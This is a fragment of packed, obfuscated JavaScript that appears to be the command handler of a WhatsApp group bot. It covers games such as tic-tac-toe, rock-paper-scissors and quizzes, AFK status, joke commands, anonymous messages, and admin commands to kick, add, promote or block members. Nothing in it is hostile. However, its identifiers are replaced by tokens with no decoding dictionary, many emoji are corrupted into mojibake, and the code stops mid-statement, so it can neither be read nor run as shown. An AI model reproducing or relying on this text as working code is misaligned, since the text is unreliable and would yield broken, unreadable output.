2P=7K[m.1l.1h(\'@\')[0]]if(2S.3c()==2P){F C.2a(m.E,[{1g:\'4V 9V\',1e:{1f:\'4H 1X ro\'},V:1}],`🔖Ž®4H 1X ro🔖Ž®\\n\\9I 4z🔖Ž‰\\n\\5S To 8v 9H?9q 1X 7s 8M`,C.2f.2m,m)2y 7K[m.1l.1h(\'@\')[0]]}1y m.z(\'*9G 6M!*\')}if(ho.4o(m.1l.1h(\'@\')[0])&&5W){8w=2l 2P=ho[m.1l.1h(\'@\')[0]]if(2S.3c()==2P){F C.2a(m.E,[{1g:\'4V Rk\',1e:{1f:\'4H 1X Ak\'},V:1}],`🔖Ž®4H 1X Ak🔖Ž®\\n\\9I 4z🔖Ž‰\\n\\5S To 8v 9H?9q 1X 7s 8M`,C.2f.2m,m)2y ho[m.1l.1h(\'@\')[0]]}1y m.z(\'*9G 6M!*\')}1o.2g=1o.2g?1o.2g:{}B 1x=3R.5Z(1o.2g).4U(1x=>1x.id&&1x.2g&&1x.5Y&&1x.id.6o(\'9O\')&&[1x.2g.hh,1x.2g.e5].2i(m.1l)&&1x.5Y==\'zU\')if(1x){B ok B 9E=!1 B hl=!1 B 9F=!1 if(!/^([1-9]|(me)?hf up|Aj?Ai|1A|Rj)$/i.1t(m.D))L 9F=!/^[1-9]$/.1t(m.D)if(m.1l!==1x.2g.hg){if(!9F)L!0}if(!9F&&1>(ok=1x.2g.rv(m.1l===1x.2g.e5,Ri(m.D)-1))){m.z({\'-3\':\'aQ 3G Rh\',\'-2\':\'h3\',\'-1\':\'h3 Ag\',0:\'h3 Ag\',}[ok])L!0}if(m.1l===1x.2g.hn)9E=2l 1y if(1x.2g.Rg===Rf)hl=2l B 7E=1x.2g.zT().2L(v=>{L{X:\'🔖Œ\',O:\'🔖­•\',1:\'1ï¸🔖ƒ£\',2:\'2ï¸🔖ƒ£\',3:\'3ï¸🔖ƒ£\',4:\'4ï¸🔖ƒ£\',5:\'5ï¸🔖ƒ£\',6:\'6ï¸🔖ƒ£\',7:\'7ï¸🔖ƒ£\',8:\'8ï¸🔖ƒ£\',9:\'9ï¸🔖ƒ£\',}[v]})if(9F){1x.2g.hm=m.1l===1x.2g.hh 9E=2l}B hn=9F?1x.2g.hg:1x.2g.hn B 7N=`zS ID:${1x.id}${7E.6n(0,3).2t(\'\')}${7E.6n(3,6).2t(\'\')}${7E.6n(6).2t(\'\')}${9E?`@${hn.1h(\'@\')[0]}e6!`:hl?`aQ Re`:`Rd ${[\'🔖Œ\',\'🔖­•\'][1*1x.2g.hm]}(@${1x.2g.hg.1h(\'@\')[0]})`}🔖Œ:@${1x.2g.hh.1h(\'@\')[0]}🔖­•:@${1x.2g.e5.1h(\'@\')[0]}Rc*hf up*to zR 2W Rb zQ`if((1x.2g.hm^9F?1x.x:1x.o)!==m.E)1x[1x.2g.hm^9F?\'x\':\'o\']=m.E if(1x.x!==1x.o)F C.3A(1x.x,7N,m,{3y:aH(7N)})F C.3A(1x.o,7N,m,{3y:aH(7N)})if(hl||9E){2y 1o.2g[1x.id]}}1o.3Q=1o.3Q?1o.3Q:{}B 1Q=3R.5Z(1o.3Q).4U(1Q=>1Q.id&&1Q.3t&&[1Q.p,1Q.p2].2i(m.1l))if(1Q){B 7O=\'\'B e7=1Z if(m.1l==1Q.p2&&/^(Ra(R9)?|zP|rw|R8?|rr|no|Af|Ae(e.)?rw|y)/i.1t(m.D)&&m.1N&&1Q.3t==\'1i\'){if(/^(rr|no|Af|n|Ae(e.)?rw)/i.1t(m.D)){C.ca(m.E,`@${1Q.p2.1h`@`[0]}ug 1n 3Q,1n 3Q is R7`,m)2y 1o.3Q[1Q.id]L!0}1Q.3t=\'5h\'1Q.A1=m.E A3(1Q.au)C.3A(m.E,`ru 3G 4x 5q to E@${1Q.p.1h`@`[0]}R6@${1Q.p2.1h`@`[0]}3T 7r a 3Q in 1n R5 E"5L S:if(!1Q.6J)C.3A(1Q.p,`3T oT\\n\\R4🔖—¿\\Ad🔖“„\\Ac🔖œ‚ï¸`,m)if(!1Q.8u)C.3A(1Q.p2,`3T oT\\n\\R3🔖—¿\\Ad🔖“„\\Ac🔖œ‚ï¸`,m)1Q.A2=dq(()=>{if(!1Q.6J&&!1Q.8u)C.3A(m.E,`R2 R1 rg\'t 8o To 8v,\\R0 QZ`)1y if(!1Q.6J||!1Q.8u){7O=!1Q.6J?1Q.p2:1Q.p C.ca(m.E,`@${(1Q.6J?1Q.p2:1Q.p).1h`@`[0]}QY\'t yk ru,aQ gr!`,m)}2y 1o.3Q[1Q.id]L!0},1Q.gh)}B Aa=m.1l==1Q.p B A9=m.1l==1Q.p2 B g=/Ab/i B b=/a2/i B k=/bW/i B e8=/^(Ab|a2|bW)/i if(Aa&&e8.1t(m.D)&&!1Q.6J&&!m.1N){1Q.6J=e8.6P(m.D.3c())[0]1Q.D=m.D m.z(`4e 3P A8 ${m.D}${!1Q.8u?`\\n\\A7 1U 1n hk to 7r`:\'\'}`)if(!1Q.8u)C.3A(1Q.p2,\'A6 hk 3G A5\\A4 it is 2h rv\',0)}if(A9&&e8.1t(m.D)&&!1Q.8u&&!m.1N){1Q.8u=e8.6P(m.D.3c())[0]1Q.6g=m.D m.z(`4e 3P A8 ${m.D}${!1Q.6J?`\\n\\A7 1U 1n hk to 7r`:\'\'}`)if(!1Q.6J)C.3A(1Q.p,\'A6 hk 3G A5\\A4 it is 2h rv\',0)}B 9D=1Q.6J B 9C=1Q.8u if(1Q.6J&&1Q.8u){A3(1Q.A2)if(b.1t(9D)&&g.1t(9C))7O=1Q.p 1y if(b.1t(9D)&&k.1t(9C))7O=1Q.p2 1y if(g.1t(9D)&&k.1t(9C))7O=1Q.p 1y if(g.1t(9D)&&b.1t(9C))7O=1Q.p2 1y if(k.1t(9D)&&b.1t(9C))7O=1Q.p 1y if(k.1t(9D)&&g.1t(9C))7O=1Q.p2 1y if(9D==9C)e7=2l C.3A(1Q.A1,`4f*ru QX*4f${e7?\'\\QW\':\'\'}@${1Q.p.1h`@`[0]}(${1Q.D})${e7?\'\':1Q.p==7O?`e6\\n`:`A0\\n`}@${1Q.p2.1h`@`[0]}(${1Q.6g})${e7?\'\':1Q.p2==7O?`e6\\n`:`A0\\n`}`.5p(),m,{3y:[1Q.p,1Q.p2]})2y 1o.3Q[1Q.id]}}B zZ=[...4v yj([...(m.2B||[]),...(m.H?[m.H.1l]:[])])]1U(B hj of zZ){B 2f=W.db.M.3M[hj]if(!2f)zY B 6N=2f.6N if(!6N||6N<0)zY B 8U=2f.9B||\'\'m.z(`rg\'t 2X al!He\'s in zX ${8U ? \'3N 8U\' + 8U : \'no 8U\'}zW ${rt(4v 7j-6N)}`.5p())}if(db.M.3M[m.1l].6N>-1){B 2f=W.db.M.3M[m.1l]m.z(`4e rS zX${2f.9B?\' fW \'+2f.9B:\'\'}zW ${rt(4v 7j-2f.6N)}`.5p())2f.6N=-1 2f.9B=\'\'}B rs=[QV,QU,QT,QS]B 4s=rs[1C.2v(1C.1V()*rs.1F)]B zV=[QR,QQ,QP,QO,QN,QM]B sK=ar(zV)QL(K){l\'kF\':{B 2f=W.db.M.3M[m.1l]2f.6N=+4v 7j 2f.9B=D m.z(`${m.e0}*3n QK*${D?\': \'+D:\'\'}`)}G l\'QJ\':l\'QI\':l\'9O\':{if(!m.1N)Q J.1v B he=1P("./3k/9O")1o.2g=1o.2g?1o.2g:{}if(3R.5Z(1o.2g).4U(1x=>1x.id.6o(\'9O\')&&[1x.2g.hh,1x.2g.e5].2i(m.1l)))Q\'4e 4y 5w in 1n 2g\'B 1x=3R.5Z(1o.2g).4U(1x=>1x.5Y===\'c4\'&&(D?1x.2m===D:2l))if(1x){m.z(\'QH qj!\')1x.o=m.E 1x.2g.e5=m.1l 1x.5Y=\'zU\'B 7E=1x.2g.zT().2L(v=>{L{X:\'🔖Œ\',O:\'🔖­•\',1:\'1ï¸🔖ƒ£\',2:\'2ï¸🔖ƒ£\',3:\'3ï¸🔖ƒ£\',4:\'4ï¸🔖ƒ£\',5:\'5ï¸🔖ƒ£\',6:\'6ï¸🔖ƒ£\',7:\'7ï¸🔖ƒ£\',8:\'8ï¸🔖ƒ£\',9:\'9ï¸🔖ƒ£\',}[v]})B 7N=`zS ID:${1x.id}${7E.6n(0,3).2t(\'\')}${7E.6n(3,6).2t(\'\')}${7E.6n(6).2t(\'\')}xl@${1x.2g.hg.1h(\'@\')[0]}dM*hf up*to zR 2W QG zQ`if(1x.x!==1x.o)F C.3A(1x.x,7N,m,{3y:aH(7N)})F C.3A(1x.o,7N,m,{3y:aH(7N)})}1y{1x={id:\'9O-\'+(+4v 7j),x:m.E,o:\'\',2g:4v he(m.1l,\'o\'),5Y:\'c4\'}if(D)1x.2m=D m.z(\'QF 1U bI\'+(D?`V 1n K 4d ${j}${K}${D}`:\'\'))1o.2g[1x.id]=1x}}G l\'QE\':l\'kQ\':{1o.2g=1o.2g?1o.2g:{}6p{if(1o.2g){2y 1o.2g C.3A(m.E,`6L yD he gN`,m)}1y if(!1o.2g){m.z(`dU he🔖Ž®pF 4D QD`)}1y Q\'?\'}1j(e){m.z(\'QC\')}}G l\'kO\':l\'3Q\':{1o.3Q=1o.3Q?1o.3Q:{}B zO=10 B zN=10 B gh=9z if(3R.5Z(1o.3Q).4U(1Q=>1Q.id.6o(\'3Q\')&&[1Q.p,1Q.p2].2i(m.1l)))m.z(`QB 3Q mu QA Qz`)if(m.2B[0]===m.1l)L m.z(`cc\'t 5h 3N Qy!`)if(!m.2B[0])L m.z(`Qx do 1a 8W to uq?4f\\Qw 1n 4Z..\\n\\6e:${j}3Q@${2j[1]}`,m.E,{3y:[2j[1]+\'@s.2d.2q\']})if(3R.5Z(1o.3Q).4U(1Q=>1Q.id.6o(\'3Q\')&&[1Q.p,1Q.p2].2i(m.2B[0])))Q`1X 4Z 1a 4y Qv is Qu 3Q 3N ah 1y:(`B id=\'Qt\'+4v 7j()*1 B Y=`4f*Qs Qr*4f@${m.1l.1h`@`[0]}*Qq*@${m.2B[0].1h`@`[0]}*to 5h 3Q**3T*@${m.2B[0].1h`@`[0]}*to V zP/rr*`1o.3Q[id]={E:F C.3A(m.E,Y,m,{3y:aH(Y)}),id:id,p:m.1l,p2:m.2B[0],3t:\'1i\',au:dq(()=>{if(1o.3Q[id])C.3A(m.E,`Qp ai Qo`,m)2y 1o.3Q[id]},9z),zO,zN,gh}}G l\'sc\':l\'3S\':l\'3w\':l\'3w\':l\'Qn\':l\'Qm\':l\'Ql\':l\'Qk\':{1Y=`*ã€Œ${W.1b}4bã€*\\n\\Qj:${W.bj}\\Qi:${W.sC}\\n\\Qh Qg to 3w🔖œ`B 1c=[{1g:`2j`,1e:{1f:\'3q 🔖\'},V:1}]B 1R={U:{R:`S:6l:qd,Y:1Y,1J:`${1b}`,1c:1c,1G:4,2Q:{fz:{2e:"I Qf Qe 1U my Qd",6b:"Qc to 3w",6T:fs.3E("5i/8L/pj.6Z"),sI:1,sH:\'S://i.hc.co/zM/zL-22-10-zK-r1-46-30-zJ.6Z\',fy:"S://i.hc.co/zM/zL-22-10-zK-r1-46-30-zJ.6Z"}}}C.N(m.E,1R,{H:m})}G l\'E\':{if(!2b)Q J.2j if(!q)Q\'Qb : 1. 5z\\n2. zI\\n3. hb\\n4. zH\\n5. 7u\\n6. gS\\n7. 2y\'if(1s[0]===\'5z\'){C.aG({5z:\'sN\'},m.E,[]).1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}1y if(1s[0]===\'zI\'){C.aG({5z:hK},m.E,[]).1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}1y if(1s[0]===\'hb\'){C.aG({hb:2l},m.E,[]).1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}1y if(1s[0]===\'zH\'){C.aG({hb:1Z},m.E,[]).1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}1y if(1s[0]===\'7u\'){C.aG({zG:2l},m.E,[]).1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}1y if(1s[0]===\'gS\'){C.aG({zG:1Z},m.E,[]).1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}1y if(1s[0]===\'2y\'){C.aG({Qa:{1W:{id:m.H.id,3B:2l}}},m.E,[]).1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}}G l\'7M\':{if(\'7M\'+m.E in aF){m.z(\'9y 4y 5w 9x 9w!\')Q 1Z}B 1r=F 3H(\'S://5K.6i.3z/h9/4p/h8/h7/7M.4j\')B 1V=1r[1C.2v(1C.1V()*1r.1F)]B zA=`*4z 1n e4 rn:*\\n${1V.aD}\\n\\zF is*${1V.2P.1F}*4z ${1V.2P.4U(v=>v.2i(\' \'))?`(zE zD 3P zC)`:\'\'}`.5p()aF[\'7M\'+m.E]={id:\'7M\'+m.E,zB:F C.3A(m.E,zA,m),...1V,9A:zz.1k(1V.2P,()=>1Z),Q9:6,}}G l\'Q8\':l\'Q7\':l\'Q6\':l\'Q5\':l\'Q4\':if(!m.H&&!D)Q`3U/z D 3N Y ${j+K}`rq=K[1].3c()zy=m.H?m.H.D?m.H.D:q?q:m.D:q?q:m.D m.z(zy.3m(/[Q3]/g,rq).3m(/[Q2]/g,rq.Q1()))G l\'4V\':{if(!1s.2t(" "))Q`2o:${j+K}5F\\n\\Q0:\\n1.5F\\n2.7a\\n3.bM\\n4.ha\\n5.9V\\n6.PZ`if(1s[0]==="5F"){if(7l.4o(m.1l.1h(\'@\')[0]))Q"9y 4y 5w 9x 9w!"B 1r=F 3H(\'S://PY.wJ.io/7l.4j\')B 1E=1r[1C.2v(1C.1V()*1r.1F)]B 2K=F C.N(m.E,{2H:{R:1E.PX},3C:\'2H/8n\'},{H:m})C.3A(m.E,`3o is 1n 2m of 1o 5F?\\n\\PW:${1E.PV}\\aC:ce`,2K).1u(()=>{7l[m.1l.1h(\'@\')[0]]=1E.2P.3c()})F 7G(9z)if(7l.4o(m.1l.1h(\'@\')[0])){1z.1B("4z: "+1E.2P)C.2a(m.E,[{1g:\'4V 5F\',1e:{1f:\'4H 1n 5F\'},V:1}],`9r 3G rm g0\\4R:${7l[m.1l.1h(\'@\')[0]]}\\n\\5S to 5h?9p 1n 4k 4d`,`${W.1b}`,m)2y 7l[m.1l.1h(\'@\')[0]]}}1y if(1s[0]===\'7a\'){if(7k.4o(m.1l.1h(\'@\')[0]))Q"9y 4y 5w 9x 9w!"B 1r=F 3H(\'S://5K.6i.3z/h9/4p/h8/h7/7k.4j\')B 1E=1r[1C.2v(1C.1V()*1r.1F)]C.g8(m.E,1E.4h,`3T 6M 1n 8s PU\\n\\zv:${1E.h6}\\aC:ce`,m).1u(()=>{7k[m.1l.1h(\'@\')[0]]=1E.2P.3c()})F 7G(9z)if(7k.4o(m.1l.1h(\'@\')[0])){1z.1B("4z: "+1E.2P)C.2a(m.E,[{1g:\'4V 7a\',1e:{1f:\'4H 1n 7a\'},V:1}],`9r 3G rm g0\\4R:${7k[m.1l.1h(\'@\')[0]]}\\n\\5S to 5h?9p 1n 4k 4d`,`${W.1b}`,m)2y 7k[m.1l.1h(\'@\')[0]]}}1y if(1s[0]===\'aj\'){if(7L.4o(m.1l.1h(\'@\')[0]))Q"9y 4y 5w 9x 9w!"B 1r=F 3H(\'S://5K.6i.3z/zx/zw/8d/PT.js\')B 1E=1r[1C.2v(1C.1V()*1r.1F)]C.3A(m.E,`3T 6M 1n e4 8s\\n\\n${1E.aD}\\aC:ce`,m).1u(()=>{7L[m.1l.1h(\'@\')[0]]=1E.2P.3c()})F 7G(9z)if(7L.4o(m.1l.1h(\'@\')[0])){1z.1B("4z: "+1E.2P)C.2a(m.E,[{1g:\'4V aj\',1e:{1f:\'4H 1X aE\'},V:1}],`9r h5\\4R:${7L[m.1l.1h(\'@\')[0]]}\\n\\5S to 5h?9p 1n 4k 4d`,`${W.1b}`,m)2y 7L[m.1l.1h(\'@\')[0]]}}1y if(1s[0]===\'ha\'){if(8t.4o(m.1l.1h(\'@\')[0]))Q"9y 4y 5w 9x 9w!"B 1r=F 3H(\'S://5K.6i.3z/zx/zw/8d/PS.js\')B 1E=1r[1C.2v(1C.1V()*1r.1F)]C.3A(m.E,`3T 6M 1n e4 8s\\n\\n${1E.aD}\\aC:ce`,m).1u(()=>{8t[m.1l.1h(\'@\')[0]]=1E.2P.3c()})F 7G(9z)if(8t.4o(m.1l.1h(\'@\')[0])){1z.1B("4z: "+1E.2P)C.2a(m.E,[{1g:\'4V ha\',1e:{1f:\'4H 1n rp\'},V:1}],`9r h5\\4R:${8t[m.1l.1h(\'@\')[0]]}\\n\\5S to 5h?9p 1n 4k 4d`,`${W.1b}`,m)2y 8t[m.1l.1h(\'@\')[0]]}}1y if(1s[0]===\'9V\'){if(7K.4o(m.1l.1h(\'@\')[0]))Q"9y 4y 5w 9x 9w!"B 1r=F 3H(\'S://5K.6i.3z/h9/4p/h8/h7/7K.4j\')B 1E=1r[1C.2v(1C.1V()*1r.1F)]C.3A(m.E,`PR 1n PQ 9V 4d:*${1E.aD}*?\\aC:ce`,m).1u(()=>{7K[m.1l.1h(\'@\')[0]]=1E.2P.3c()})F 7G(9z)if(7K.4o(m.1l.1h(\'@\')[0])){1z.1B("4z: "+1E.2P)C.2a(m.E,[{1g:\'4V 9V\',1e:{1f:\'4H 1X ro\'},V:1}],`9r h5\\4R:${7K[m.1l.1h(\'@\')[0]]}\\n\\5S to 5h?9p 1n 4k 4d`,`${W.1b}`,m)2y 7K[m.1l.1h(\'@\')[0]]}}1y if(1s[0]===\'4V bM\'){if(7J.4o(m.1l.1h(\'@\')[0]))Q"9y 4y 5w 9x 9w!"B 1r=F 3H(\'S://5K.6i.3z/h9/4p/h8/h7/7J.4j\')B 1E=1r[1C.2v(1C.1V()*1r.1F)]C.3A(m.E,`*4z 1n e4 rn:*\\n${1E.aD}*\\aC:ce`,m).1u(()=>{7J[m.1l.1h(\'@\')[0]]=1E.2P.3c()cd[m.1l.1h(\'@\')[0]]=1E.h6})F 7G(9z)if(7J.4o(m.1l.1h(\'@\')[0])){1z.1B("4z: "+1E.2P)C.2a(m.E,[{1g:\'4V bM\',1e:{1f:\'4H 1X PP\'},V:1}],`9r h5\\4R:${7J[m.1l.1h(\'@\')[0]]}\\zv:${cd[m.1l.1h(\'@\')[0]]}\\n\\5S to 5h?9p 1n 4k 4d`,`${W.1b}`,m)2y 7J[m.1l.1h(\'@\')[0]]2y cd[m.1l.1h(\'@\')[0]]}}}G l\'7I\':l\'9N\':{if(7I.4o(m.1l.1h(\'@\')[0]))Q"9y 4y 5w 9x 9w!"B{zt,zu}=1P(\'./3k/9N\')if(!D)Q`gU:${3R.7X(zu).2t(\' | \')}\\PO uP:${j}9N PN`B 1E=F zt(D.3c())C.3A(m.E,`*3o is 1n 1E of:${1E.aD.3c()}*?\\n\\aC:${(1E.au/cb).df(2)}PM`,m).1u(()=>{7I[m.1l.1h(\'@\')[0]]=1E.2P})F 7G(1E.au)if(7I.4o(m.1l.1h(\'@\')[0])){1z.1B("4z: "+1E.2P)m.z("9r 3G rm g0\\4R: "+7I[m.1l.1h(\'@\')[0]])2y 7I[m.1l.1h(\'@\')[0]]}}G l\'zp\':{1d zs=rl[1C.2v(1C.1V()*rl.1F)]B zo=`[🔖Ž°zr zq🔖Ž°]\\n------------------------\\n\\n🔖’:🔖Œ:🔖‡\\n${zs}<=====\\n🔖‡:🔖Œ:🔖’\\n\\n------------------------\\n[🔖Ž°zr zq🔖Ž°]\\n\\n*PL*:\\yZ 1a 2k 3 of 1n ui PK\\PJ 4e PI\\n\\PH:🔖’:🔖’:🔖’4f<=====`B 1c=[{1g:\'zp\',1e:{1f:\'🔖Ž°PG PF🔖Ž°\'},V:1}]F C.2a(m.E,1c,zo,1b,m)}G l\'PE\':{if(!m.1N)Q J.1v B 5n=3V.2L(u=>u.id)B me=m.1l B 8j=5n[1C.2v(1C.1V()*5n.1F)]B 4m=`🔖‘«rf PD Is@${me.1h(\'@\')[0]}🔖¤ï¸@${8j.1h(\'@\')[0]}`B 5u=[me,8j]B 1c=[{1g:\'🔖¤ï¸\',1e:{1f:\'🔖¤ï¸\'},V:1}]F C.2a(m.E,1c,4m,1b,m,{3y:5u})}G l\'lo\':{if(!m.1N)Q J.1v B 5n=3V.2L(u=>u.id)B rk=5n[1C.2v(1C.1V()*5n.1F)]B 8j=5n[1C.2v(1C.1V()*5n.1F)]B 4m=`@${rk.1h(\'@\')[0]}🔖¤ï¸@${8j.1h(\'@\')[0]}PC,3o\'s PB On🔖¤ï¸🔖’–🔖‘€`B zn=[rk,8j]B 1c=[{1g:\'🔖¤ï¸\',1e:{1f:\'🔖¤ï¸\'},V:1}]F C.2a(m.E,1c,4m,1b,m,{3y:zn})}G l\'PA\':{if(!a7)Q J.Pz if(!D)Q`2o:${j+K}hi|uX`B 4m=`${D.1h("|")[0]}`B 1c=[{1g:\'5D\',1e:{1f:`${1H}`},V:1}]F C.2a(m.E,1c,4m,`${D.1h("|")[1]}`,m)}G l\'4t\':{if(!D)Q`9v 8s\\n\\6e:${j+K}i 9Q?`B rj=[`cc`,`cc\'t`,`dV`,`Of Py 4e cc!!!`]B zm=rj[1C.2v(1C.1V()*rj.1F)]B 4m=`*cc ${D}*\\4R:${zm}`B 1c=[{1g:\'7i\',1e:{1f:\'zj🔖—¿\'},V:1}]F C.2a(m.E,1c,4m,1b,m)}G l\'is\':{if(!D)Q`9v 8s\\n\\6e:${j+K}Px Pw?`B fV=[`Pv`,`No`,`It Pu Be`,`Pt Ps`]B 7H=fV[1C.2v(1C.1V()*fV.1F)]B 4m=`*Is ${D}*\\4R:${7H}`B 1c=[{1g:\'7i\',1e:{1f:\'e3\'},V:1}]F C.2a(m.E,1c,4m,1b,m)}G l\'aR\':{if(!D)Q`9v 8s\\n\\6e:${j+K}5N i 2k Pr?`B ri=[\'5 2J 4J\',\'10 2J 4J\',\'15 2J 4J\',\'20 2J 4J\',\'25 2J 4J\',\'30 2J 4J\',\'35 2J 4J\',\'40 2J 4J\',\'45 2J 4J\',\'50 2J 4J\',\'55 2J 4J\',\'60 2J 4J\',\'65 2J 4J\',\'70 2J 4J\',\'75 2J 4J\',\'80 2J 4J\',\'85 2J 4J\',\'90 2J 4J\',\'7t 2J 4J\',\'5 4I 2J\',\'10 4I 2J\',\'15 4I 2J\',\'20 4I 2J\',\'25 4I 2J\',\'30 4I 2J\',\'35 4I 2J\',\'40 4I 2J\',\'45 4I 2J\',\'50 4I 2J\',\'55 4I 2J\',\'60 4I 2J\',\'65 4I 2J\',\'70 4I 2J\',\'75 4I 2J\',\'80 4I 2J\',\'85 4I 2J\',\'90 4I 2J\',\'7t 4I 2J\',\'1 2J Pq\',\'2 2J h4\',\'3 2J h4\',\'4 2J h4\',\'5 2J h4\',\'zl\',\'1X Pp Po zl\']B zk=ri[1C.2v(1C.1V()*ri.1F)]B 4m=`*${K}${D}*\\4R:${zk}`B 1c=[{1g:\'7i\',1e:{1f:\'zj🔖—¿\'},V:1}]F C.2a(m.E,1c,4m,1b,m)}G l\'5E\':{if(!D)Q`9v 8s\\n\\6e:${j+K}is 2h 2m?`B rd=[`9v rf Gf`,`I rh zi`,`I rg\'t zi,9v rf Pn`]B 7H=rd[1C.2v(1C.1V()*rd.1F)]B 4m=`*3o ${D}*\\4R:${7H}`B 1c=[{1g:\'7i\',1e:{1f:\'e3\'},V:1}]F C.2a(m.E,1c,4m,1b,m)}G l\'lB\':{if(!D)Q`9v 8s\\n\\6e:${j+K}is 2h 2m?`B rc=[`In 1n Pm`,`On Pl`,`On Pk`,`In 1n Pj`,`I Pi uH tP 2h pG`,`It pp be Ph`]B 7H=rc[1C.2v(1C.1V()*rc.1F)]B 4m=`*Pg ${D}*\\4R:${7H}`B 1c=[{1g:\'7i\',1e:{1f:\'e3\'},V:1}]F C.2a(m.E,1c,4m,1b,m)}G l\'9P\':{if(!D)Q`9v 8s\\n\\6e:${j+K}to ww 8Y?`B rb=[`Pf...`,`It\'s Pe Pd`, `Pc bk cc\'t 4z`,`Pb sG On y2`,`Pa P9!zh???`,`P8 Ah🔖˜®🔖€🔖’¨,7v\'t pI 6M`,`P7 I P6:(`,`1X P5,P4:(`,`zh P3🔖˜?`]B 7H=rb[1C.2v(1C.1V()*rb.1F)]B 4m=`*pq ${D}*\\4R:${7H}`B 1c=[{1g:\'7i\',1e:{1f:\'e3\'},V:1}]F C.2a(m.E,1c,4m,1b,m)}G l\'lA\':{if(!D)Q`2o:${j+K}my uJ`B ra=[\'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\',\'10\',\'11\',\'12\',\'13\',\'14\',\'15\',\'16\',\'17\',\'18\',\'19\',\'20\',\'21\',\'22\',\'23\',\'24\',\'25\',\'26\',\'27\',\'28\',\'29\',\'30\',\'31\',\'32\',\'33\',\'34\',\'35\',\'36\',\'37\',\'38\',\'39\',\'40\',\'41\',\'42\',\'43\',\'44\',\'45\',\'46\',\'47\',\'48\',\'49\',\'50\',\'51\',\'52\',\'53\',\'54\',\'55\',\'56\',\'57\',\'58\',\'59\',\'60\',\'61\',\'62\',\'63\',\'64\',\'65\',\'66\',\'67\',\'68\',\'69\',\'70\',\'71\',\'72\',\'73\',\'74\',\'75\',\'76\',\'77\',\'78\',\'79\',\'80\',\'81\',\'82\',\'83\',\'84\',\'85\',\'86\',\'87\',\'88\',\'89\',\'90\',\'91\',\'92\',\'93\',\'94\',\'95\',\'96\',\'97\',\'98\',\'99\',\'7t\']B 7H=ra[1C.2v(1C.1V()*ra.1F)]B 4m=`*P2 ${D}*\\4R:${7H}%`B 1c=[{1g:\'7i\',1e:{1f:\'e3\'},V:1}]F C.2a(m.E,1c,4m,1b,m)}G l\'a8\':{B zg=`*1X bk 5R r6 yV c5:*\\n*${a8(bm.bl())}*`B 1c=[{1g:\'5D\',1e:{1f:\'2z\'},V:1}]F C.2a(m.E,1c,zg,1b,m,{H:fx})}G l\'P1\':l\'8B\':{if(!D)Q`2o:${j+K}P0 OZ`B 5j=dg+\'@s.2d.2q\'B me=m.1l B c0=`4B 9e:@${me.1h(\'@\')[0]}\\qM:@${5j.1h(\'@\')[0]}\\n\\n${K}${D}`B 5u=[5j,me]B 1c=[{1g:\'7i\',1e:{1f:\'🔖z0\'},V:1}]F C.2a(5j,1c,c0,1b,m,{3y:5u,H:qf})B bZ=`*OY 3G 4x 5q*\\n*To 3q@${5j.1h(\'@\')[0]}*\\OX 1a🔖™4f`F C.2a(m.E,1c,bZ,1b,m,{3y:5u,H:fx})}G l\'8I\':{if(!2b)Q J.2j gR={8I:{D:1s[0],2n:{5d:m.E,3B:2l,id:H.id}}}C.N(m.E,gR)}G l\'2t\':{if(!2b)Q J.2j if(!D)Q\'4c 1n 1v 1q!\'if(!9f(1s[0])&&!1s[0].2i(\'2d.3z\'))Q\'3v h3!\'m.z(J.1i)B 1E=1s[0].1h(\'S://E.2d.3z/\')[1]F C.OW(1E).1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}G l\'oK\':{if(!2b)Q J.2j F C.OV(m.E).1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}G l\'oG\':{if(!2b)Q J.2j if(!D)Q`2o:${j+K}2N|2u`W.2N=D.1h("|")[0]W.2u=D.1h("|")[1]m.z(`OU 3G 4x OT OS to\\n\\n${1H}OR:${W.2N}\\n${1H}bT:${W.2u}`)}G l\'bh\':{if(!m.1N)Q J.1v if(!2M)Q J.3h if(!2G)Q J.2r B 3M=m.2B[0]?m.2B[0]:m.H?m.H.1l:D.3m(/[^0-9]/g,\'\')+\'@s.2d.2q\'F C.4S(m.E,[3M],\'4N\').1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}G l\'fr\':{if(!m.1N)Q J.1v if(!2M)Q J.3h if(!2G)Q J.2r B 3M=m.H?m.H.1l:D.3m(/[^0-9]/g,\'\')+\'@s.2d.2q\'F C.4S(m.E,[3M],\'fr\').1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}G l\'fp\':{if(!m.1N)Q J.1v if(!2M)Q J.3h if(!2G)Q J.2r B 3M=m.2B[0]?m.2B[0]:m.H?m.H.1l:D.3m(/[^0-9]/g,\'\')+\'@s.2d.2q\'F C.4S(m.E,[3M],\'fp\').1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}G l\'fo\':{if(!m.1N)Q J.1v if(!2M)Q J.3h if(!2G)Q J.2r B 3M=m.2B[0]?m.2B[0]:m.H?m.H.1l:D.3m(/[^0-9]/g,\'\')+\'@s.2d.2q\'F C.4S(m.E,[3M],\'fo\').1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}G l\'fu\':{if(!2b)Q J.2j B 3M=m.2B[0]?m.2B[0]:m.H?m.H.1l:D.3m(/[^0-9]/g,\'\')+\'@s.2d.2q\'F C.zf(3M,\'fu\').1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}G l\'ft\':{if(!2b)Q J.2j B 3M=m.2B[0]?m.2B[0]:m.H?m.H.1l:D.3m(/[^0-9]/g,\'\')+\'@s.2d.2q\'F C.zf(3M,\'ft\').1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}G l\'oB\':l\'OQ\':{if(!m.1N)Q J.1v if(!2M)Q J.3h if(!2G)Q J.2r if(!D)Q\'gz ?\'F C.OP(m.E,D).1u((2c)=>m.z(J.4X)).1j((P)=>m.z(2I(P)))}G l\'oA\':l\'OO\':{if(!m.1N)Q J.1v if(!2M)Q J.3h if(!2G)Q J.2r if(!D)Q\'gz ?\'F 